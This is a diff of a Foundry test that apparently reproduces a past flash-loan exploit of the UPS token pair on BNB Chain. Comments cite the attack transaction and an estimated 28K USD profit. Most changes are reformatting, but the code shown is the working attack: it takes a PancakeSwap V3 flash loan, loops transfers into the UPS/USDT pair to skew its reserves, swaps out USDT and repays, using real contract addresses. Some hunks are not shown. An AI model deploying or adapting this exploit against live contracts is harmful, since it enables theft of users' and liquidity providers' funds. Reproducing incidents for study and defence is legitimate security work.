@@ -3,19 +3,24 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IWBNB} from "src/interfaces/IWBNB.sol";
+
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
 // TX : https://app.blocksec.com/explorer/tx/bsc/0xd03702e17171a32464ce748b8797008d59e2dbcecd3b3847d5138414566c886d
 // GUY : https://twitter.com/0xNickLFranklin/status/1777589021058728214
 // Profit : ~ 28K USD
 // REASON : business logic flaw XD transfer to pair won't lead to pair's amount change
 
 contract ContractTest is Test {
-
     IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 UPS = IERC20(0x3dA4828640aD831F3301A4597821Cc3461B06678);
-    IUniswapV3Pair pool = IUniswapV3Pair(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
-    IUniswapV2Pair ups_usdt = IUniswapV2Pair(0xA2633ca9Eb7465E7dB54be30f62F577f039a2984);
-    IUniswapV2Router router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV3Pair pool =
+        IUniswapV3Pair(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
+    IUniswapV2Pair ups_usdt =
+        IUniswapV2Pair(0xA2633ca9Eb7465E7dB54be30f62F577f039a2984);
+    IUniswapV2Router router =
+        IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
     uint256 borrow_amount;
 
     function setUp() external {
@@ -24,10 +29,18 @@ contract ContractTest is Test {
     }
 
     function testExploit() external {
-        emit log_named_decimal_uint("[Begin] Attacker USDT before exploit", USDT.balanceOf(address(this)), 18);
+        emit log_named_decimal_uint(
+            "[Begin] Attacker USDT before exploit",
+            USDT.balanceOf(address(this)),
+            18
+        );
         borrow_amount = 3_500_000 ether;
         pool.flash(address(this), borrow_amount, 0, "");
-        emit log_named_decimal_uint("[End] Attacker USDT after exploit", USDT.balanceOf(address(this)), 18);
+        emit log_named_decimal_uint(
+            "[End] Attacker USDT after exploit",
+            USDT.balanceOf(address(this)),
+            18
+        );
     }
 
     function pancakeV3FlashCallback(
@@ -60,20 +73,33 @@ contract ContractTest is Test {
         while (i < 3) {
             transfer_amount = UPS.balanceOf(address(ups_usdt));
             UPS.transfer(address(ups_usdt), transfer_amount);
-            (uint256 r0, uint256 r1,) = ups_usdt.getReserves();
-            uint256 amountOut = router.getAmountOut(transfer_amount - r0, r0, r1);
+            (uint256 r0, uint256 r1, ) = ups_usdt.getReserves();
+            uint256 amountOut = router.getAmountOut(
+                transfer_amount - r0,
+                r0,
+                r1
+            );
             ups_usdt.swap(0, amountOut, address(this), "");
             i++;
         }
         USDT.transfer(address(pool), borrow_amount + fee0);
     }
 
-    function swap_token_to_token(address a, address b, uint256 amount) internal {
+    function swap_token_to_token(
+        address a,
+        address b,
+        uint256 amount
+    ) internal {
         IERC20(a).approve(address(router), amount);
         address[] memory path = new address[](2);
         path[0] = address(a);
         path[1] = address(b);
-        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
+        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            amount,
+            0,
+            path,
+            address(this),
+            block.timestamp
+        );
     }
-
 }
